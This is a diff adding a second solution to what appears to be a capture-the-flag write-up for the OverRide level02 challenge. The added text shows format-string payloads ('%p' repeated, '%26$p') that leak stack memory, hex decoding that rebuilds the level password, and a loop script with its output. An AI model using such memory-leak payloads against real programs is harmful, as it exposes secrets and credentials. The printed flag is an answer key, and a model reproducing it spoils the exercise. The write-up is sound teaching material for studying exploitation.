@@ -109,6 +109,69 @@ cat /home/users/level03/.pass 1>&2
 Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
 ```
 
+**SECOND METHOD
+
+
+
+
+```
+(python -c 'print " %p " * 100 + "\n" + "AAAA"') | ./level02 | xargs -n 1 echo
+
+...
+0x756e505234376848
+0x45414a3561733951
+0x377a7143574e6758
+0x354a35686e475873
+...
+
+The length of the flag string is 40 so we need 5 * 8 (16/2 hex len)
+
+the value at the 26th position on the stack  
+(python -c 'print "%26$p" + "\n" + "AAAA"') | ./level02
+0x48336750664b394d
+
+then lets reconstruct our flag
+
+echo "0x756e505234376848" | xxd -r -p | rev
+Hh74RPnu
+
+
+0x756e505234376848 ==> Hh74RPnu
+0x45414a3561733951 ==> Q9sa5JAE
+0x377a7143574e6758 ==> XgNWCqz7
+0x354a35686e475873 ==> sXGnh5J5
+0x48336750664b394d ==> M9KfPg3H
+
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+--[ Username: user
+--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+*****************************************
+Greetings, user!
+$ pwd
+/home/users/level02
+```
+
+simplified script
+
+```
+level02@OverRide:~$ for ((i=1; i<=26; i++)); do (python -c "print '%$i\$p'" && echo) | ./level02 | grep 0x ; done
+
+0x7fffffffe4c0 does not have access!
+0x2a2a2a2a2a2a2a2a does not have access!
+0x2a2a2a2a2a2a2a2a does not have access!
+0x7fffffffe6b8 does not have access!
+0x1f7ff9a08 does not have access!
+0x100000000 does not have access!
+0x756e505234376848 does not have access!
+0x45414a3561733951 does not have access!
+0x377a7143574e6758 does not have access!
+0x354a35686e475873 does not have access!
+0x48336750664b394d does not have access!
+```
+
+
+
 
 
 
